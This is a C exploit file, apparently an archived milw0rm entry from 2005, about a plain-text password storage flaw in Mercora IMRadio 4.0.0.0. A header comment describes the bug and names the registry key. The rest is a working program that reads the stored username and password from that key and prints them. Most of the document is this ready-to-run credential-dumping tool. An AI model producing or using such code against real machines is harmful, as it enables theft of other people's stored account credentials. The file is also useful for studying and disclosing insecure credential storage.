/*================================================================

Mercora IMRadio 4.0.0.0 password disclosure local exploit by Kozan

Discovered & Coded by: Kozan
Credits to ATmaCA
Web: www.spyinstructors.com
Mail: kozan@netmagister.com

=====[ Application ]==============================================

Application: Mercora IMRadio 4.0.0.0 (and probably prior versions)
Vendor: www.mercora.com

=====[ Introduction ]=============================================

Search, listen, and record any music. With over 2.5 million unique
tracks, Mercora is a legal music radio network powered by people,
DJs, and artists just like you. Mercora combines Internet streaming,
country-specific copyright compliance, and social networking
technologies to create the next generation of digital music.
Version 4.0 supports friends and family listening, a vastly
simplified interface, customized listening, and live music search.

=====[ Bug ]======================================================

Mercora IMRadio 4.0.0.0 stores username and passwords in the Windows
Registry in plain text. A local user can read the values.

HKEY_CURRENT_USER\Software\Mercora\MercoraClient\Profiles
Auto.Username = Mercora IMRadio Username
Auto.Password = Mercora IMRadio Password

=====[ Vendor Confirmed ]=========================================

No

=====[ Fix ]======================================================

There is no solution at the time of this entry.

================================================================*/

#include <stdio.h>
#include <windows.h>
#define BUF 100

int main()
{
       HKEY hKey;
       char Username[BUF], Password[BUF];
       DWORD dwBUFLEN = BUF;
       LONG lRet;

       if( RegOpenKeyEx(HKEY_CURRENT_USER,
                                       "Software\\Mercora\\MercoraClient\\Profiles",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey
                                       ) == ERROR_SUCCESS )
       {
               lRet = RegQueryValueEx(hKey, "Auto.Password", NULL, NULL, (LPBYTE)Password, &dwBUFLEN);
               if (lRet != ERROR_SUCCESS || dwBUFLEN > BUF) strcpy(Password,"Not Found!");

               lRet = RegQueryValueEx(hKey, "Auto.Username", NULL, NULL, (LPBYTE)Username, &dwBUFLEN);
               if (lRet != ERROR_SUCCESS || dwBUFLEN > BUF) strcpy(Username,"Not Found!");

               RegCloseKey(hKey);

               fprintf(stdout, "Mercora IMRadio 4.0.0.0 password disclosure local exploit by Kozan\n");
               fprintf(stdout, "Credits to ATmaCA\n");
               fprintf(stdout, "www.spyinstructors.com \n");
               fprintf(stdout, "kozan@spyinstructors.com\n\n");
               fprintf(stdout, "Username :\t%s\n",Username);
               fprintf(stdout, "Password :\t%s\n",Password);
       }
       else
       {
               fprintf(stderr, "Mercora IMRadio 4.0.0.0 is not installed on your system!\n");
       }

       return 0;
}

// milw0rm.com [2005-08-22]